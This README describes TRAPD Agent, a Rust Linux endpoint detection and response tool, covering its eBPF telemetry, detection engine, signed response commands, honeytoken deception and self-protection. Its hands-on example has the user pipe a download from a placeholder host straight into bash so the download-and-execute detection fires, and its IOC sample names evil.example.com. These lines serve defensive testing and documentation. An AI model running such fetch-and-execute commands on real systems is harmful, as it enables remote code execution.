# TRAPD Agent

TRAPD Agent is a lightweight Linux **EDR** (Endpoint Detection & Response) and
security-telemetry agent written in Rust. It does far more than collect logs: it
continuously observes process, network, filesystem, user and kernel activity —
optionally down to the syscall level via **eBPF** — runs a platform-neutral
**detection engine** over that stream, can **actively respond** to threats
(kill, quarantine, isolate, block) on signed backend command, plants and watches
**honeytokens** (deception), and **protects itself** from tampering.

It streams structured NDJSON events to a TRAPD backend, or runs fully **offline**
writing telemetry to a local file — so you can drop it on any Linux box and see
what it does in seconds, with no backend at all.

```
                         ┌──────────────────────────────────────────────┐
                         │                 trapd-agent                   │
                         │                                               │
  kernel  ─ eBPF ──────► │  collectors ─┐                                │
  /proc   ─ poll ──────► │  (telemetry) │                                │
  auth.log ────────────► │              ▼                                │
  journal / nginx / … ─► │              │                                │
  inotify  ────────────► │        event pipeline ──► detection engine    │
                         │              │ (durable spool)  │ (findings)   │
                         │              ▼                  ▼              │
                         │   local NDJSON / backend     prevention engine │
                         │        ingest                 (active response)│
                         │                                  ▲             │
                         │   self-protection           signed commands    │
                         │   (watchdog, anti-ptrace,    from backend       │
                         │    integrity, hardening)                        │
                         └──────────────────────────────────────────────┘
```

---

## Table of contents

- [What the agent does](#what-the-agent-does)
- [Architecture & data flow](#architecture--data-flow)
- [Capabilities in detail](#capabilities-in-detail)
  - [1. Telemetry collection](#1-telemetry-collection)
  - [2. Detection engine](#2-detection-engine)
  - [3. Prevention / active response](#3-prevention--active-response)
  - [4. Deception (honeytokens)](#4-deception-honeytokens)
  - [5. Self-protection](#5-self-protection)
  - [6. Asset inventory](#6-asset-inventory)
- [Runtime modes: online vs. offline](#runtime-modes-online-vs-offline)
- [Installation](#installation)
- [Configuration](#configuration)
- [Event schema](#event-schema)
- [Hands-on example: catch a download-and-execute chain offline](#hands-on-example-catch-a-download-and-execute-chain-offline)
- [Building from source](#building-from-source)
- [Backend API](#backend-api)
- [Updating](#updating)
- [Releasing a new version](#releasing-a-new-version)
- [Repository layout](#repository-layout)

---

## What the agent does

| Pillar | What it gives you |
|--------|-------------------|
| **Telemetry** | Process, network, system, filesystem, user-logon and (with eBPF) rich syscall-level events — exec, fork, file open/unlink/rename/chmod/chown, mmap, ptrace, kernel-module load, setuid, DNS, IPC/shm, namespace changes, kill attempts. |
| **Detection** | A userspace, platform-neutral analytics engine: IOC matching (hashes/IPs/domains), ATT&CK-mapped behavioural heuristics, C2 **beaconing** detection, **DNS-tunnelling** detection, port-scan / lateral-movement / cloud-metadata recon detection. Each finding is a first-class event. |
| **Prevention** | Active response driven by **Ed25519-signed** backend commands or local IoC rules: kill PID, quarantine/restore file, isolate/de-isolate host network, block/unblock IP, hot-reload policy, manage packages. Every action is reversible and audited. |
| **Deception** | Builds a per-host **recon profile** of plausible secret locations (SSH keys, AWS creds, `.kube/config`, …), deploys backend-generated **honeytokens** with camouflage, breadcrumbs and an optional **out-of-band canary** second channel. With eBPF it fires a `critical` detection the instant a token is read, copied, `stat`-ed, `exec`-ed or `mmap`-ed — with the accessor's full process lineage and session context — and can **freeze** (SIGSTOP + snapshot), kill or isolate the accessor on policy. |
| **Self-protection** | Watchdog subprocess (auto-restart), anti-ptrace detection, binary self-integrity verification (optionally Ed25519-signed), kernel-hardening audit, plus a self-tamper collector. |
| **Fleet management** | First-run enrollment, heartbeat metrics, remote config pull with ETag, signed command pull, asset inventory, and a daily self-updater. |

---

## Architecture & data flow

The agent is a single Tokio async binary (`trapd-agent`). On startup
(`agent/src/main.rs`) it:

1. **Self-protects first** — runs the watchdog, audits kernel hardening, verifies
   its own binary integrity, then spawns a detached watchdog child.
2. **Establishes identity** — loads/creates a persistent `device_id`, then either
   enrolls with the backend (online) or runs offline.
3. **Starts collectors** — each implements the `Collector` trait and pushes
   `AgentEvent`s into a shared **mpsc pipeline**. eBPF collectors are spawned only
   if the compiled eBPF object is present; otherwise the agent degrades gracefully
   to `/proc` polling.
4. **Consumes the pipeline** — a single consumer task:
   - writes each event locally (NDJSON to stdout or file) and into a **durable
     spool** for backend ingest — online the spool is disk-backed
     (`<state>/spool/queue.ndjson`), so a backend outage or an agent restart no
     longer loses telemetry: events accumulate (bounded) and are replayed on the
     next run (at-least-once; the backend dedupes on `event_id`). Offline it is
     in-memory only (the NDJSON file is the record). Capacity overrides with
     `TRAPD_SPOOL_MAX`;
   - runs each event through the **detection engine**; findings are re-injected as
     new events;
   - **tees** both raw events and findings into the **prevention engine**.
5. **Talks to the backend** (online only) — transport (batched event ingest),
   heartbeat, config puller, command puller, inventory reporter.

Everything is **platform-neutral above the collector layer**: the detection and
prevention engines operate on the shared `schema::AgentEvent` type, so a future
Windows agent can reuse them unchanged — only how raw telemetry is gathered differs.

---

## Capabilities in detail

### 1. Telemetry collection

Collectors live in `agent/src/collectors/linux/`. Two tiers:

**Polling / log collectors (always available, no special kernel support):**

| Collector | Source | Emits |
|-----------|--------|-------|
| `SystemCollector` | `sysinfo` / `/proc` | `system/snapshot` (CPU, mem, uptime, load, OS, kernel) — startup + every 60 s |
| `ProcessCollector` | `/proc` diff | `process/create`, `process/terminate` — every 3 s |
| `NetworkCollector` | `/proc/net` | `network/connection` (proto, src/dst, state, owning PID) — every 5 s |
| `AuthLogCollector` | `/var/log/auth.log` | `user/logon`, `user/logon_failed`, `user/session_open`, `user/session_close` |
| `LogCollector` | files, systemd journal, syslog | `log/log` — generic pipeline (nginx, apache, postgres, mysql, docker, ssh, sudo, auditd, json, custom). Inode tracking, rotation, truncation, persisted offsets, multiline, per-source rate limits. |
| `FilesystemCollector` | `inotify` | `filesystem/create|delete|modify` under watched paths (`/etc`, `/bin`, `/tmp` by default) |
| `AgentProtectCollector` | agent's own files | `agent_tamper` events |
| `FimCollector` | SHA256 baseline of `fim_paths` (`/etc`, `/usr/bin`, `/boot`, … by default) | `filesystem/integrity_violation` (modified / added / removed) — every `fim_interval_secs`; baseline persists across restarts |

**eBPF collectors (when the eBPF object is built & installed; see
[Building from source](#building-from-source)):**

| Collector | Kernel hooks | Emits |
|-----------|--------------|-------|
| `EbpfExecCollector` | `sched_process_exec` | rich `process/exec` (uid/gid, cwd, full cmdline, container id, **exe SHA256**) |
| `EbpfSyscallCollector` | many tracepoints | `fork`, `file open/unlink/rename/chmod/chown`, `mmap`, `ptrace`, `module_load`, `setuid`, `dns_query`, `shm`, `ns_change`, `kill_attempt`, `memfd`, and honeytoken-access detection |

The kernel-side programs are in the standalone `trapd-agent-ebpf` crate
(`exec`, `fork`, `network`, `dns`, `file_open`, `file_manip`, `write`, `mmap`,
`ptrace`, `kill`, `module_load`, `setuid`, `shm`, `memfd`, `namespace`,
`process_block`).

**Executable hashing.** Every exec (both the eBPF tracer and the `/proc`
poller) is SHA256-hashed once at collection time (`collectors/linux/exehash.rs`)
and carried on the event as `exe_sha256`. The hash is cached by path+mtime and
size-capped, feeds the detection engine's **IOC hash matching** and the IOA
process-tree lineage, and can be disabled with `TRAPD_EXEC_HASH=off`.

### 2. Detection engine

`agent/src/detection/` — runs synchronously in the consumer, allocation-light,
never blocks the pipeline. Every collected event is passed through
`DetectionEngine::inspect()`, which returns zero or more `class=detection`
findings (each carrying a MITRE ATT&CK mapping, a confidence score and evidence):

- **IOC matching** (`ioc.rs`) — O(1) lookups against `<config>/iocs.json`
  (SHA256 hashes, destination IPs, exact domains + parent-domain suffixes). The
  feed is hot-reloaded every 5 minutes — no restart needed.
- **Behavioural heuristics** (`behavior.rs`) — signature-free, pure functions over
  process command lines (e.g. shell spawning a downloader → download-and-execute
  chain). Each maps to an ATT&CK technique.
- **C2 beaconing** (`beaconing.rs`) — flags clockwork-regular connections to a
  destination (low coefficient-of-variation in inter-arrival times).
- **DNS tunnelling** (`dns_tunnel.rs`) — flags long high-cardinality sub-domain
  labels or high look-up rates under one registrable domain.
- **Recon / lateral movement** (`netscan.rs`) — port scans, address sweeps on
  admin ports (SSH/SMB/RDP/WinRM), and cloud-metadata (`169.254.169.254`) access.
- **Honeytoken access** (`honeytoken.rs`) — see [Deception](#4-deception-honeytokens).
- **YARA** (`yara_scanner.rs`, optional `--features yara`) — file scanning when
  the `libyara` C library is available at build time.
- **Stateful IOA correlation** (`ioa/`) — the layer *above* the stateless
  heuristics. Where the above ask "is this one event bad?", the IOA engine asks
  "do these events, **in this process lineage**, **in this order**, **within
  this window**, form an attack?" — the way CrowdStrike's Indicators of Attack
  work. It keeps a **persistent process tree** (PID→lineage, with cached exec
  SHA256 hashes) fed from the `exec`/`fork`/`create`/`terminate` events, and
  runs **sliding-window state machines** (one declarative chain per pattern)
  that advance only when the next stage is seen in the *same session subtree*.
  Built-in chains: `download_and_execute` (shell → downloader → payload exec
  from a temp dir), `privilege_escalation_activity` (unprivileged → `setuid(0)`
  → post-escalation action) and `credential_access_exfil` (secret-store read →
  outbound connection). A completed chain fires one high-confidence
  `category=ioa.*` detection carrying the full stage trail, timings and the
  accessor's lineage. The tree **also enriches every other detection** with the
  acting process's `process_lineage`, so each finding shows *how the process
  came to exist*. Bounded (capped nodes + tombstone GC), I/O-free and never
  blocks the consumer. Toggle the whole engine with `TRAPD_IOA=off`. Executable
  hashes are computed once at collection (see below) and flow into the lineage.

### 3. Prevention / active response

`agent/src/prevention/` — the "R" in EDR. Where collectors are read-only, this
subsystem *takes action*. Every action is:

1. **Authorised** — by a local IoC rule (`<config>/policy.json`) or an
   **Ed25519-signed** command from the backend, verified against
   `<config>/command_signing.pub`, with expiry windows and a replay-protected
   nonce store.
2. **Audited** — emitted as a `class=prevention` event into the normal pipeline,
   giving the backend a tamper-evident record.
3. **Reversible** — every quarantine has a restore, every isolation a de-isolation,
   every IP block an unblock.

Supported actions (`CommandPayload.kind`): `kill_pid`, `quarantine_file` /
`restore_file`, `isolate_network` / `deisolate_network` (iptables/nftables, with a
backend allowlist so the host can still reach TRAPD), `block_ip` / `unblock_ip`
(optional TTL), `update_policy` (hot-reload IoC rules), `install_package` /
`remove_package` / `upgrade_package`, `deploy_honeytoken` / `revoke_honeytoken`, and
the forensic-response verbs `freeze_pid` / `thaw_pid` (SIGSTOP/SIGCONT).
An optional LSM loader (`lsm_loader.rs`) syncs policy into a kernel enforcement layer.

### 4. Deception (honeytokens)

`agent/src/deception/` — plant believable bait and catch whoever touches it. The
agent owns *what is physically on the host*; the backend owns *intent, content and
correlation*. The two reconcile over the signed-command and event channels.

- **Profiling** (`profiler.rs`) — condenses the asset inventory into a
  **recon profile**: the secret artefacts an attacker would expect on *this*
  host (MITRE **T1552** Unsecured Credentials / **T1083** Discovery), e.g.
  `~/.aws/credentials` only if `awscli` is installed, `~/.kube/config`,
  `.pgpass`, `.my.cnf`, `id_rsa`, web-root `.env`, `passwords.kdbx`, shell
  history, `.git-credentials`, browser stores, fake `/etc/shadow`. Candidates
  carry an evidence-gated score and a **host persona** (consistent internal
  hostname/domain/subnet so all tokens on a host look like one coherent
  environment); both are sent to the backend on the inventory channel.
- **Placement** (`mod.rs`) — the backend generates host-specific content
  (no LLM ever runs on the endpoint) and issues a signed `deploy_honeytoken`.
  The agent writes it with **camouflage**: atomic temp-write + rename, explicit
  file mode, and with `mimic_neighbor` it copies a sibling's owner/group and
  atime/mtime so the bait doesn't look freshly planted. It can also lay
  **breadcrumbs** — create-mode files and byte-exact, append-safe history lines
  (the "forgotten `mysql -u root -p…`") that cross-link to the token to make it
  findable — all reversibly removed on revoke. Safety invariants: paths must be
  absolute with no `..`, it **never overwrites** an existing file, and **revoke
  only removes what the agent itself planted** (tracked in
  `<state>/honeytokens.json`).
- **Bait hygiene & anti-fingerprinting** (`validate.rs`) — every payload is
  validated *before* it ever hits disk: per-kind structural checks (AWS `AKIA…`
  INI, JWT, kubeconfig, `.pgpass`, PEM SSH key, magic bytes for PDF/OOXML/KDBX,
  …), a **forbidden-watermark guard** so no shared `trapd`/`honeytoken` tell can
  leak across the fleet, and enforced uniqueness of the canary marker. A bad
  deploy fails fast instead of revealing the trap.
- **Detection** (`detection/honeytoken.rs` + `trapd-agent-ebpf/src/file_open.rs`)
  — eBPF maps (`HONEYTOKEN_PATHS`, `HONEYTOKEN_DIRS`, `HONEYTOKEN_INODES`) are
  armed from the on-disk register every 15 s. Coverage goes well beyond a plain
  open: a `vfs_open` kprobe catches an **inode-level content read** (even through
  a hardlink or `mmap`), and tracepoints catch `open`/`openat2`, `stat`/`statx`/
  `readlink`/`getdents` (directory recon), `execve`, `linkat`, `unlinkat`/
  `renameat2` (tamper). Each hit becomes a `class=detection,
  action=honeytoken_access`, `severity=critical` event scored per access kind,
  with MITRE mapping and enriched with the accessor's full `/proc` **process
  lineage** and **session context** (loginuid, tty, cwd, cgroup, container id +
  runtime, namespaces, and the correlated remote login IP). A built-in,
  config-extendable allowlist suppresses benign sweepers (mlocate/updatedb, AV,
  backup tools, the agent itself).
- **Response & forensics** (`prevention/engine.rs`, `forensics/`) — the
  prevention engine reacts per the `honeytoken_response` policy on an escalating
  scale: `none` < `alert` < **`freeze`** (SIGSTOP the accessor and capture a
  process **snapshot** — state/exe/cwd/cmdline/open-fds — so you can triage
  before deciding) < `kill` (SIGKILL) < `isolate` (full network isolation). A
  **flight recorder** bundles the buffered pre-history of the offending
  session/PID with the trigger event, and with `honeytoken_deception_escalation`
  enabled a hit can raise further deception/escalation. An operator can later
  release a frozen process with the signed `thaw_pid` command.
- **Out-of-band canary** (`registry.rs`) — a token can carry a second,
  independent channel (`aws_cloudtrail`, `dns`, `http`, `kube_api`,
  `ssh_honeypot`): the agent records the `tracking_id`/markers in the deploy
  audit, and if the bait is ever *used off-host* the backend correlates the
  foreign signal (CloudTrail alarm, tracking-domain hit, …) back to this token,
  host and accessor — a high-confidence "the credential left the building" signal
  that survives even if on-host detection is evaded.

### 5. Self-protection

`agent/src/selfprotect/`:

- **Watchdog** (`watchdog.rs`) — a detached child (`setsid`) polls `/proc/<pid>`
  and re-launches the agent if it dies, CrowdStrike-style; combined with systemd
  `Restart=always` the chain is never permanently broken.
- **Anti-ptrace** (`anti_ptrace.rs`) — polls `/proc/self/status` `TracerPid`; a
  non-zero value (someone attached a debugger) emits a `critical` `agent_tamper`
  event. Defence-in-depth fallback to the eBPF `sys_enter_ptrace` hook.
- **Binary integrity** (`binary_integrity.rs`) — verifies the SHA256 of
  `/proc/self/exe` against a stored baseline on every start, optionally checking
  an Ed25519 signature; a mismatch aborts the agent.
- **Kernel hardening audit** (`kernel_hardening.rs`) — advisory check of
  `/proc/sys/kernel/*` security parameters at startup.

### 6. Asset inventory

`agent/src/inventory/` — a full host profile (OS, hardware, disks, network
interfaces, installed packages, user accounts) plus the deception recon profile.
Sent to the backend 15 s after startup and every 6 hours; offline it's written to
`<state>/inventory.json` so the asset profile is still inspectable on a test box.

---

## Runtime modes: online vs. offline

The agent auto-detects its mode so a bare `trapd-agent` run "just works":

- **Online** — requires `TRAPD_BACKEND_URL` (and `TRAPD_ENROLL_TOKEN` on first
  run). Enables enrollment, batched event ingest, heartbeat, config pull, signed
  command pull, inventory POST, and the prevention subsystem.
- **Offline** — enabled by `TRAPD_OFFLINE=1` *or* simply by leaving
  `TRAPD_BACKEND_URL` unset. All backend channels are skipped; telemetry and
  detections are emitted locally only. Ideal for testing/forensics on an isolated
  box. (Prevention's signed-command path needs the backend, so active response is
  disabled offline — local IoC policy still loads.)

---

## Installation

```sh
curl -sSL https://raw.githubusercontent.com/trapd-cloud/trapd-agent/main/deploy/install.sh | sudo bash
```

The installer fetches the latest release binary from GitHub, installs it to
`/usr/local/bin/trapd-agent`, registers a hardened systemd service, and sets up a
daily auto-update timer.

The systemd unit (`deploy/trapd-agent.service`) runs the agent locked down with
`ProtectSystem=strict`, `ProtectHome=true`, `NoNewPrivileges=true`,
`MemoryDenyWriteExecute=true`, a tight `SystemCallFilter`, and only the
capabilities it genuinely needs (`CAP_NET_ADMIN`, `CAP_BPF`, `CAP_PERFMON`,
`CAP_SYS_PTRACE`, `CAP_NET_RAW`, `CAP_IPC_LOCK`, `CAP_LINUX_IMMUTABLE`).

---

## Configuration

Edit `/etc/trapd/agent.env` after installation, then `systemctl restart trapd-agent`:

```ini
# Required for a backend-connected agent: URL of your TRAPD backend.
# If omitted (or with TRAPD_OFFLINE=1) the agent runs OFFLINE and only writes
# telemetry locally — handy for testing on a fresh box.
TRAPD_BACKEND_URL=https://your-backend.com

# First-run enrollment token from the dashboard. Once enrolled, durable
# credentials are stored in the state dir and this is no longer needed.
TRAPD_ENROLL_TOKEN=enroll_xxxx

# Optional: output destination — "file" writes to $TRAPD_LOG_DIR/events.ndjson;
# anything else (or unset) writes NDJSON to stdout.
TRAPD_OUTPUT=file

# Optional: log verbosity (default: info)
RUST_LOG=info

# Optional: force offline mode even when a backend URL is set.
#TRAPD_OFFLINE=1

# Optional: cap enrollment retries (0 / unset = retry forever, never crash-loop)
#TRAPD_ENROLL_MAX_ATTEMPTS=0
```

Most behaviour (poll intervals, enabled collectors, watched FS paths, prevention
toggle, isolation allowlist, **log sources**) is delivered at runtime by the backend via the
config-pull endpoint (`AgentConfig`) and can change without a restart. The
deception subsystem is likewise backend-controlled:
`honeytoken_detection_enabled`, `honeytoken_response` (`none`/`alert`/`freeze`/
`kill`/`isolate`), `honeytoken_accessor_allowlist` (extra benign accessors) and
`honeytoken_deception_escalation`.

Log collection (`logs_enabled`, default on) auto-discovers standard Linux
security logs when `logs` is empty. Override with an explicit list:

```yaml
logs:
  - name: nginx
    type: file
    path: /var/log/nginx/access.log
    parser: nginx_access
  - name: app
    type: file
    path: /var/log/myapp/*.log
    parser: json
```

**Automated response to local detections** is likewise config-driven and
**opt-in** (off by default, so a false positive cannot kill a legitimate process
unattended): `auto_response_enabled` arms it; `auto_response_action`
(`none`/`alert`/`kill`/`quarantine`/`isolate`) sets the action; it fires only
above `auto_response_min_severity` (`info`…`critical`) **and**
`auto_response_min_confidence` (0–100); `auto_response_allowlist` exempts
`rule_id`s/categories. It covers the whole detection stream — IOC hash hits,
reverse shells, IOA attack-chains, ransomware indicators, `setuid(0)` privilege
escalation and credential-store access — degrades safely when no concrete target
is known, de-dupes via a per-(rule, pid) cooldown, and audits every action as a
`prevention` event. This complements the signed backend response commands.

**Process-memory scanning** (`memory_scan_enabled`, default on;
`memory_scan_interval_secs`) periodically sweeps every process's
`/proc/<pid>/maps` + `environ` and raises detections for anonymous-executable
(RWX), memfd-backed and deleted-image code regions and runtime `LD_PRELOAD`
injection — feeding the same auto-response path. It reads only `maps`/`environ`,
so it is cheap.

**Real-Time Response (RTR)** rides the existing Ed25519-signed command channel
(no new auth surface, no mTLS dependency) and is **opt-in** via `rtr_enabled`
(default off). Signed commands `RunScript` (remediation script execution with a
timeout), `CollectFile`, `ListDirectory` and `CollectProcessMemory` return their
(capped, `rtr_max_artifact_bytes`) output as base64 in the audited event stream.

### Filesystem layout

The agent keeps state, config and logs in fixed, `$HOME`-independent locations
(each overridable via an env var). This is what makes it run reliably under a
hardened systemd unit where `$HOME` is not set.

| Kind   | Default          | Override env       | Contents                                                            |
|--------|------------------|--------------------|---------------------------------------------------------------------|
| state  | `/var/lib/trapd` | `TRAPD_STATE_DIR`  | `device_id`, `credentials.json`, command nonces, FIM baselines, `honeytokens.json`, quarantine, `inventory.json` (offline) |
| config | `/etc/trapd`     | `TRAPD_CONFIG_DIR` | `agent.env`, `policy.json`, `iocs.json`, `command_signing.pub`, TLS certs |
| logs   | `/var/log/trapd` | `TRAPD_LOG_DIR`    | `events.ndjson`                                                     |

The state dir is hardened to `0700`; credentials are written atomically at `0600`.

---

## Event schema

Every event — collected, detection, or prevention — shares one envelope:

```json
{
  "event_id":  "uuid-v4",
  "agent_id":  "uuid-v4",
  "hostname":  "myserver",
  "timestamp": "2026-06-01T14:32:01.123Z",
  "class":     "process|network|system|user|filesystem|memory|kernel|ipc|prevention|detection|log",
  "action":    "create|exec|connection|detected|honeytoken_access|...",
  "severity":  "info|low|medium|high|critical",
  "data":      { }
}
```

`data` is **untagged** — route and validate it on the backend by `class` + `action`
(e.g. `process/create` → `ProcessCreateData`, `detection/detected` → `DetectionData`,
`prevention/*` → `PreventionEventData`). The complete catalogue of payload schemas,
event actions, command/policy/inventory schemas and backend endpoint contracts is
maintained in **[`AGENTS.md`](AGENTS.md)** — that file is the authoritative
backend API reference.

A small sample of what the agent emits:

| Event class  | Action(s)                       | Example data |
|--------------|---------------------------------|--------------|
| `process`    | `create`, `terminate`, `exec`   | PID/PPID, name, exe, cmdline, uid, username, cwd |
| `network`    | `connection`, `dns_query`       | protocol, src/dst addr+port, state, owning PID |
| `system`     | `snapshot`                      | CPU %, mem, uptime, load avg, OS, kernel |
| `filesystem` | `create`, `delete`, `modify`    | path |
| `user`       | `logon`, `session_open/close`   | username, source IP, auth method, success |
| `detection`  | `detected`, `honeytoken_access` | rule id, ATT&CK mapping, confidence, evidence, accessor lineage |
| `prevention` | `process_blocked`, `file_quarantined`, `network_isolated`, … | kind, target, success, reason, rule/command id |

---

## Hands-on example: catch a download-and-execute chain offline

This walks through running the agent **with no backend** and watching its
behavioural detection engine flag a classic LOLBin attack pattern (a shell
spawning a network downloader → MITRE T1059 / T1105).

**1. Build the agent:**

```sh
cargo build --release --manifest-path agent/Cargo.toml
```

**2. Run it offline, writing NDJSON to a local file:**

```sh
mkdir -p trapd-test/{state,cfg,log}
TRAPD_STATE_DIR=$PWD/trapd-test/state \
TRAPD_CONFIG_DIR=$PWD/trapd-test/cfg \
TRAPD_LOG_DIR=$PWD/trapd-test/log \
TRAPD_OUTPUT=file RUST_LOG=info \
  ./target/release/trapd-agent
```

You'll see it start in **OFFLINE** mode and bring up the collectors and the
detection engine. Leave it running.

**3. In a second terminal, generate suspicious activity** — a shell invoking a
downloader, which the behavioural heuristic recognises as a download-and-execute
chain:

```sh
bash -c "curl -s https://example.com/payload.sh | bash"
```

**4. Tail the telemetry and filter for detections:**

```sh
tail -f trapd-test/log/events.ndjson | grep '"class":"detection"'
```

You'll see a detection event roughly like:

```json
{
  "class": "detection",
  "action": "detected",
  "severity": "high",
  "data": {
    "rule_id": "lolbin.download_pipe_shell",
    "title": "Download piped directly into a shell",
    "category": "lolbin",
    "mitre_tactic": "TA0002 Execution",
    "mitre_technique": "T1059.004",
    "confidence": 75,
    "subject": "/usr/bin/bash",
    "detail": "Shell bash downloads and executes in one step: curl -s https://example.com/payload.sh | bash",
    "evidence": { "cmdline": "curl -s https://example.com/payload.sh | bash" }
  }
}
```

> Severity is derived from `confidence` (`0–39` low, `40–69` medium, `70–89` high,
> `90+` critical), so this `confidence: 75` finding is reported as `high`.

**5. (Optional) Try the IOC feed.** Drop a known-bad indicator into
`trapd-test/cfg/iocs.json` and the engine hot-reloads it within ~5 minutes:

```json
{
  "ips": ["203.0.113.66"],
  "domains": ["evil.example.com"],
  "hashes": ["3b7c…<sha256 of a binary>"]
}
```

Any process exec whose binary hashes to that value, or any connection/DNS query to
those indicators, now produces an IOC detection event.

> **Going further (online):** point `TRAPD_BACKEND_URL` at a TRAPD backend and set
> `TRAPD_ENROLL_TOKEN`. The same detection that just fired locally would also be
> shipped to the backend, which could respond with a signed `kill_pid` or
> `isolate_network` command — the prevention engine executes it and audits the
> result back as a `prevention` event.

---

## Building from source

**Agent (standard build, no native dependencies):**

```sh
# Requires Rust 1.75+ and a Linux x86_64 host
cargo build --release --manifest-path agent/Cargo.toml
cp target/release/trapd-agent /usr/local/bin/trapd-agent
```

**Run the test suite / linter:**

```sh
cargo test   --manifest-path agent/Cargo.toml
cargo clippy --manifest-path agent/Cargo.toml -- -D warnings
```

**Optional YARA support:**

```sh
# Requires the libyara C library + headers at build time
cargo build --release --manifest-path agent/Cargo.toml --features yara
```

**eBPF programs (kernel-side telemetry):** the `trapd-agent-ebpf` crate lives
outside the workspace because it targets `bpfel-unknown-none` and needs a pinned
nightly toolchain. Build it with the xtask helper:

```sh
cargo binstall bpf-linker           # one-time; installs the upstream prebuilt binary
cargo xtask build-ebpf --release    # pinned nightly + rust-src installed automatically
```

If the compiled eBPF object isn't present, the agent logs a warning and runs in
polling-only mode — exec and syscall-level events are simply unavailable, nothing
crashes.

---

## Backend API

The agent speaks a small REST contract to the backend. Full request/response
schemas, auth, cadences and serialization rules live in **[`AGENTS.md`](AGENTS.md)**.
At a glance:

| Endpoint | Auth | Purpose / cadence |
|----------|------|-------------------|
| `POST /api/v1/agents/enroll` | none | First-run; returns `agent_id` + `agent_secret` |
| `POST /api/v1/ingest/events` | bearer | Batched event array (≤100), flushed every 5 s |
| `POST /api/v1/agents/{id}/heartbeat` | bearer | Liveness + host metrics, every 30 s |
| `GET /api/v1/agents/{id}/config` | bearer | Remote config with `ETag`/`304`, every 60 s |
| `GET /api/v1/agents/{id}/commands` | bearer | Ed25519-signed response commands |
| `POST /api/v1/agents/{id}/inventory` | bearer | Asset + recon profile, 15 s after start then every 6 h |

All authenticated calls use `Authorization: Bearer <agent_secret>` over rustls,
with optional CA pinning and mTLS from the config dir. **Commands are rejected
unless they carry a valid Ed25519 signature, match this `agent_id`, fall within
their expiry window, and present a fresh (non-replayed) nonce.**

---

## Updating

```sh
sudo trapd-update
```

The updater compares the installed version against the latest GitHub release and
replaces the binary atomically if a newer version is available. A systemd timer
also runs `trapd-update` automatically every day at 03:00.

---

## Releasing a new version

```sh
git tag v0.4.0
git push origin v0.4.0
```

The `release` GitHub Actions workflow triggers on tag push, builds the release
binary, and publishes it to GitHub Releases. Installed agents pick it up within
24 hours via the auto-updater.

---

## Repository layout

```
agent/                     Main trapd-agent binary (workspace member)
  src/
    main.rs                Startup, pipeline wiring, mode selection
    schema/                AgentEvent envelope + all payload schemas
    collectors/linux/      Telemetry collectors (polling + eBPF)
    detection/             IOC + behavioural + beaconing/DNS/recon engine
    prevention/            Active response: kill, quarantine, isolate, block
    deception/             Honeytoken profiling, placement, bait validation, registry, OOB canary
    selfprotect/           Watchdog, anti-ptrace, integrity, hardening
    enrollment/ http/ transport/ heartbeat/ config/ inventory/ output/ paths/
trapd-agent-ebpf/          Kernel-side eBPF programs (separate toolchain)
xtask/                     `cargo xtask build-ebpf` helper
deploy/                    install.sh, hardened systemd unit, logrotate
AGENTS.md                  Authoritative backend API & schema reference
```

For contributor and backend-integration details — every event action, payload
schema, command/policy/inventory format and endpoint contract — see
**[`AGENTS.md`](AGENTS.md)**.
